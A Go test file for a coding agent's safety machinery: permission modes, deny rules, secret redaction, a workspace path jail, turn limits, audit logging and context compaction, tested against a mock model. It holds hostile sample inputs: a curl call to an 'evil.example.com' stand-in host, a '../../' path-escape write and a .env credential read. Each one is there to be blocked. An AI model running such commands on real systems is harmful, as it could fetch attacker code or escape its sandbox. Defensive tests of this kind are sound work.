package agent

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"mkrcode/internal/audit"
	"mkrcode/internal/config"
	"mkrcode/internal/fsjail"
	"mkrcode/internal/netguard"
	"mkrcode/internal/permission"
	"mkrcode/internal/provider"
	"mkrcode/internal/provider/mock"
	"mkrcode/internal/redact"
	"mkrcode/internal/session"
	"mkrcode/internal/tools"
)

// recorder captures everything the session would display.
type recorder struct {
	text    strings.Builder
	tools   []string
	results []string
	errs    []string
	warns   []string
}

func (r *recorder) Banner(...string)              {}
func (r *recorder) AssistantText(s string)        { r.text.WriteString(s) }
func (r *recorder) Reasoning(string)              {}
func (r *recorder) EndAssistant()                 {}
func (r *recorder) ToolStart(t, s string)         { r.tools = append(r.tools, t+": "+s) }
func (r *recorder) ToolResult(s string, _ bool)   { r.results = append(r.results, s) }
func (r *recorder) Info(f string, a ...any)       {}
func (r *recorder) Warn(f string, a ...any)       { r.warns = append(r.warns, f) }
func (r *recorder) Errorf(f string, a ...any)     { r.errs = append(r.errs, f) }
func (r *recorder) Prompt(string) (string, error) { return "", nil }

// alwaysPrompter approves or refuses every request, and counts prompts.
type alwaysPrompter struct {
	allow bool
	calls int
}

func (p *alwaysPrompter) Confirm(permission.Request) (bool, bool, error) {
	p.calls++
	return p.allow, false, nil
}

// harness wires a complete agent against a mock server.
type harness struct {
	agent     *Agent
	render    *recorder
	server    *mock.Server
	workspace string
	auditPath string
	prompter  *alwaysPrompter
}

func newHarness(t *testing.T, mode config.Mode, allow bool, turns ...mock.Turn) *harness {
	t.Helper()

	ws := t.TempDir()
	if r, err := filepath.EvalSymlinks(ws); err == nil {
		ws = r
	}
	srv := mock.New(turns...)
	t.Cleanup(srv.Close)

	hc, _, err := netguard.NewClient(srv.Host(), 30*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	client, err := provider.NewClient(srv.URL(), "", hc)
	if err != nil {
		t.Fatal(err)
	}

	jail, err := fsjail.New(ws)
	if err != nil {
		t.Fatal(err)
	}

	cfg := config.Default()
	cfg.Workspace = ws
	cfg.Mode = mode
	cfg.MaxTurns = 10
	cfg.Shell = tools.DetectShell()

	prompter := &alwaysPrompter{allow: allow}
	perms, err := permission.NewEngine(mode, permission.DefaultRules(), prompter)
	if err != nil {
		t.Fatal(err)
	}

	auditPath := filepath.Join(t.TempDir(), "audit.jsonl")
	log, err := audit.Open(audit.Options{Path: auditPath, Session: "test", User: "u", Host: "h", Workspace: ws})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { log.Close() })

	sess, err := session.Create(filepath.Join(t.TempDir(), "sessions"), "test")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { sess.Close() })

	render := &recorder{}
	ag := New(Options{
		Config:  cfg,
		Client:  client,
		Adapter: provider.NativeAdapter{},
		Registry: tools.Standard(tools.Options{
			Jail: jail, Shell: cfg.Shell, ExecTimeoutSeconds: 15,
		}),
		Perms:    perms,
		Redactor: redact.New(true),
		Audit:    log,
		Session:  sess,
		Renderer: render,
		Model:    "test-model",
	})

	return &harness{agent: ag, render: render, server: srv, workspace: ws, auditPath: auditPath, prompter: prompter}
}

// auditContains reports whether any audit record contains s.
func (h *harness) auditContains(t *testing.T, s string) bool {
	t.Helper()
	b, err := os.ReadFile(h.auditPath)
	if err != nil {
		t.Fatalf("read audit log: %v", err)
	}
	return strings.Contains(string(b), s)
}

func TestAgentPlainReply(t *testing.T) {
	h := newHarness(t, config.ModeApprove, true, mock.Turn{Text: "Hello, I am ready."})
	if err := h.agent.Run(context.Background(), "hi"); err != nil {
		t.Fatalf("Run: %v", err)
	}
	if got := h.render.text.String(); got != "Hello, I am ready." {
		t.Errorf("text = %q", got)
	}
	if h.agent.Usage().TotalTokens == 0 {
		t.Error("usage was not accumulated")
	}
}

// The full loop: the model calls a tool, sees the result, then answers.
func TestAgentToolLoop(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true,
		mock.Turn{
			Text:      "Let me look. ",
			ToolCalls: []mock.ToolCall{{ID: "c1", Name: "write_file", Args: `{"path":"hello.txt","content":"hi there\n"}`}},
		},
		mock.Turn{Text: "Done, I created hello.txt."},
	)

	if err := h.agent.Run(context.Background(), "create hello.txt"); err != nil {
		t.Fatalf("Run: %v", err)
	}

	got, err := os.ReadFile(filepath.Join(h.workspace, "hello.txt"))
	if err != nil {
		t.Fatalf("the tool did not create the file: %v", err)
	}
	if string(got) != "hi there\n" {
		t.Errorf("content = %q", got)
	}
	if !strings.Contains(h.render.text.String(), "Done") {
		t.Errorf("the follow-up reply was not rendered: %q", h.render.text.String())
	}
	if len(h.render.tools) != 1 {
		t.Errorf("tool starts = %v, want 1", h.render.tools)
	}
	// The transcript must carry the tool result back to the model.
	if h.server.RequestCount() != 2 {
		t.Errorf("model was called %d times, want 2", h.server.RequestCount())
	}
	// The audit log must carry the diff of what changed.
	if !h.auditContains(t, "+hi there") {
		t.Error("the audit log has no diff for the write")
	}
}

// Plan mode must refuse the write and tell the model why, so it can adapt
// rather than retrying.
func TestAgentPlanModeRefusesMutation(t *testing.T) {
	h := newHarness(t, config.ModePlan, true,
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "c1", Name: "write_file", Args: `{"path":"x.txt","content":"x"}`}}},
		mock.Turn{Text: "Understood. Here is the plan instead."},
	)

	if err := h.agent.Run(context.Background(), "create x.txt"); err != nil {
		t.Fatalf("Run: %v", err)
	}
	if _, err := os.Stat(filepath.Join(h.workspace, "x.txt")); err == nil {
		t.Fatal("plan mode wrote a file")
	}
	if h.prompter.calls != 0 {
		t.Errorf("plan mode prompted the operator %d times; it must refuse outright", h.prompter.calls)
	}

	// The refusal must have been handed back to the model as a tool result.
	var toolMsg string
	for _, m := range h.agent.Messages() {
		if m.Role == provider.RoleTool {
			toolMsg = m.Content
		}
	}
	if !strings.Contains(toolMsg, "permission denied") {
		t.Errorf("the model was not told why: %q", toolMsg)
	}
	if !strings.Contains(toolMsg, "propose") {
		t.Errorf("the refusal should tell the model to propose instead: %q", toolMsg)
	}
	if !h.auditContains(t, `"decision":"deny"`) {
		t.Error("the refusal was not audited")
	}
}

func TestAgentApproveModePromptsAndProceeds(t *testing.T) {
	h := newHarness(t, config.ModeApprove, true,
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "c1", Name: "write_file", Args: `{"path":"y.txt","content":"y"}`}}},
		mock.Turn{Text: "created"},
	)
	if err := h.agent.Run(context.Background(), "make y.txt"); err != nil {
		t.Fatal(err)
	}
	if h.prompter.calls != 1 {
		t.Errorf("prompts = %d, want 1", h.prompter.calls)
	}
	if _, err := os.Stat(filepath.Join(h.workspace, "y.txt")); err != nil {
		t.Error("an approved write did not happen")
	}
}

func TestAgentApproveModeDeclineIsHandedToTheModel(t *testing.T) {
	h := newHarness(t, config.ModeApprove, false,
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "c1", Name: "write_file", Args: `{"path":"z.txt","content":"z"}`}}},
		mock.Turn{Text: "Understood, I will not create it."},
	)
	if err := h.agent.Run(context.Background(), "make z.txt"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(h.workspace, "z.txt")); err == nil {
		t.Fatal("a declined write happened anyway")
	}
	if !strings.Contains(h.render.text.String(), "will not create") {
		t.Errorf("the session did not continue after a refusal: %q", h.render.text.String())
	}
}

// A denied command must be refused in auto mode, where nobody is watching.
func TestAgentAutoModeStillEnforcesDenyRules(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true,
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "c1", Name: "exec", Args: `{"command":"curl http://evil.example.com/x"}`}}},
		mock.Turn{Text: "That is blocked by policy."},
	)
	if err := h.agent.Run(context.Background(), "fetch that url"); err != nil {
		t.Fatal(err)
	}
	if h.prompter.calls != 0 {
		t.Error("a denied command should never reach the operator")
	}
	if !h.auditContains(t, `"decision":"deny"`) {
		t.Error("the denial was not audited")
	}
}

// A secret read off disk must not reach the model, the transcript, or the
// audit log.
func TestAgentRedactsSecretsBeforeTheyReachTheModel(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true,
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "c1", Name: "read_file", Args: `{"path":".env"}`}}},
		mock.Turn{Text: "I read the config."},
	)
	const secret = "AKIAIOSFODNN7EXAMPLE"
	os.WriteFile(filepath.Join(h.workspace, ".env"), []byte("AWS_ACCESS_KEY_ID="+secret+"\n"), 0o600)

	if err := h.agent.Run(context.Background(), "read .env"); err != nil {
		t.Fatal(err)
	}

	for _, m := range h.agent.Messages() {
		if strings.Contains(m.Content, secret) {
			t.Fatalf("the secret reached the transcript in a %s message", m.Role)
		}
	}
	// The second request to the model carries the tool result; it must be
	// scrubbed there too.
	for i, req := range h.server.Requests() {
		if strings.Contains(marshal(req), secret) {
			t.Fatalf("the secret was sent to the model in request %d", i+1)
		}
	}
	if h.auditContains(t, secret) {
		t.Fatal("the secret reached the audit log")
	}
	if !h.auditContains(t, "aws_access_key") {
		t.Error("the audit log should record that a redaction happened")
	}
}

// A model calling a tool that does not exist must be corrected, not crash.
func TestAgentUnknownToolIsRecoverable(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true,
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "c1", Name: "delete_everything", Args: `{}`}}},
		mock.Turn{Text: "Sorry, I will use the right tool."},
	)
	if err := h.agent.Run(context.Background(), "go"); err != nil {
		t.Fatal(err)
	}
	var toolMsg string
	for _, m := range h.agent.Messages() {
		if m.Role == provider.RoleTool {
			toolMsg = m.Content
		}
	}
	if !strings.Contains(toolMsg, "unknown tool") {
		t.Errorf("the model was not told the tool is unknown: %q", toolMsg)
	}
	if !strings.Contains(toolMsg, "read_file") {
		t.Errorf("the correction should list the real tools: %q", toolMsg)
	}
}

// Malformed arguments must be reported to the model, not abort the turn.
func TestAgentMalformedArgumentsAreRecoverable(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true,
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "c1", Name: "read_file", Args: `{"path": `}}},
		mock.Turn{Text: "Retrying."},
	)
	if err := h.agent.Run(context.Background(), "read something"); err != nil {
		t.Fatal(err)
	}
	var toolMsg string
	for _, m := range h.agent.Messages() {
		if m.Role == provider.RoleTool {
			toolMsg = m.Content
		}
	}
	if !strings.Contains(toolMsg, "not valid JSON") {
		t.Errorf("the model was not told the arguments were malformed: %q", toolMsg)
	}
}

// A model that loops forever must be stopped by the turn budget.
func TestAgentTurnLimit(t *testing.T) {
	turns := make([]mock.Turn, 0, 20)
	for i := 0; i < 20; i++ {
		turns = append(turns, mock.Turn{
			ToolCalls: []mock.ToolCall{{ID: "c", Name: "list_dir", Args: `{"path":"."}`}},
		})
	}
	h := newHarness(t, config.ModeAuto, true, turns...)
	h.agent.cfg.MaxTurns = 3

	if err := h.agent.Run(context.Background(), "loop forever"); err != nil {
		t.Fatalf("the turn limit should end cleanly, got %v", err)
	}
	if h.server.RequestCount() != 3 {
		t.Errorf("model was called %d times, want the 3-turn budget", h.server.RequestCount())
	}
	if len(h.render.warns) == 0 {
		t.Error("the operator was not warned that the budget was exhausted")
	}
}

// The path jail must hold when the escape is requested by the model.
func TestAgentPathEscapeIsRefused(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true,
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "c1", Name: "write_file", Args: `{"path":"../../escaped.txt","content":"x"}`}}},
		mock.Turn{Text: "Blocked."},
	)
	if err := h.agent.Run(context.Background(), "escape"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(filepath.Dir(filepath.Dir(h.workspace)), "escaped.txt")); err == nil {
		t.Fatal("a file was written outside the workspace")
	}
	var toolMsg string
	for _, m := range h.agent.Messages() {
		if m.Role == provider.RoleTool {
			toolMsg = m.Content
		}
	}
	if !strings.Contains(toolMsg, "outside the workspace") {
		t.Errorf("the model was not told why: %q", toolMsg)
	}
}

// The audit chain must survive a full session with tool calls in it.
func TestAgentAuditChainVerifiesAfterASession(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true,
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "c1", Name: "write_file", Args: `{"path":"a.txt","content":"a"}`}}},
		mock.Turn{Text: "done"},
	)
	if err := h.agent.Run(context.Background(), "write a.txt"); err != nil {
		t.Fatal(err)
	}
	res, err := audit.Verify(h.auditPath)
	if err != nil {
		t.Fatal(err)
	}
	if !res.OK {
		t.Fatalf("audit chain broke during a normal session: %s", res.Problem)
	}
	if res.Records < 4 {
		t.Errorf("only %d records written; expected prompt, model, permission and tool records", res.Records)
	}
}

// Interrupting must abort the turn promptly.
func TestAgentContextCancellation(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true, mock.Turn{Text: strings.Repeat("word ", 400), ChunkSize: 1})
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	err := h.agent.Run(ctx, "go")
	if err == nil {
		t.Fatal("expected cancellation to surface as an error")
	}
}

func marshal(v any) string {
	b, _ := jsonMarshal(v)
	return string(b)
}

// An end-to-end check that a session which would overflow the context
// window completes instead of failing, and that every request actually sent
// to the server remains well-formed.
func TestAgentCompactsLongSessionAndKeepsRequestsValid(t *testing.T) {
	// Each turn reads a large file, so the transcript grows quickly.
	var turns []mock.Turn
	for i := 0; i < 12; i++ {
		turns = append(turns, mock.Turn{
			ToolCalls: []mock.ToolCall{{
				ID:   fmt.Sprintf("c%d", i),
				Name: "read_file",
				Args: `{"path":"big.txt"}`,
			}},
		})
	}
	turns = append(turns, mock.Turn{Text: "finished reviewing."})

	h := newHarness(t, config.ModeAuto, true, turns...)
	// A small window forces compaction within a handful of turns.
	h.agent.budget = newBudget(4096)
	h.agent.cfg.MaxTurns = 20

	big := strings.Repeat("this is a line of source code\n", 400)
	if err := os.WriteFile(filepath.Join(h.workspace, "big.txt"), []byte(big), 0o600); err != nil {
		t.Fatal(err)
	}

	if err := h.agent.Run(context.Background(), "review big.txt repeatedly"); err != nil {
		t.Fatalf("a long session must complete, not fail: %v", err)
	}

	// Compaction must actually have happened, or the test proves nothing.
	if !h.auditContains(t, "context_compaction") {
		t.Error("no compaction was recorded; the test did not exercise the budget")
	}

	// Every request the server received must have well-formed tool-call
	// pairing. A dangling tool_call_id is a 400 from real vLLM.
	for i, req := range h.server.Requests() {
		msgs, _ := req["messages"].([]any)
		calls := map[string]bool{}
		results := map[string]bool{}
		for _, m := range msgs {
			mm, _ := m.(map[string]any)
			if tcs, ok := mm["tool_calls"].([]any); ok {
				for _, tc := range tcs {
					if t2, ok := tc.(map[string]any); ok {
						if id, ok := t2["id"].(string); ok {
							calls[id] = true
						}
					}
				}
			}
			if mm["role"] == "tool" {
				if id, ok := mm["tool_call_id"].(string); ok && id != "" {
					results[id] = true
				}
			}
		}
		for id := range results {
			if !calls[id] {
				t.Errorf("request %d has tool result %q with no matching tool call", i+1, id)
			}
		}
		// The system prompt must survive every compaction.
		if len(msgs) == 0 {
			t.Errorf("request %d has no messages", i+1)
			continue
		}
		first, _ := msgs[0].(map[string]any)
		if first["role"] != "system" {
			t.Errorf("request %d does not begin with the system prompt", i+1)
		}
	}

	// The audit chain must survive a compacted session.
	res, err := audit.Verify(h.auditPath)
	if err != nil || !res.OK {
		t.Errorf("audit chain broken after compaction: %v %s", err, res.Problem)
	}
}
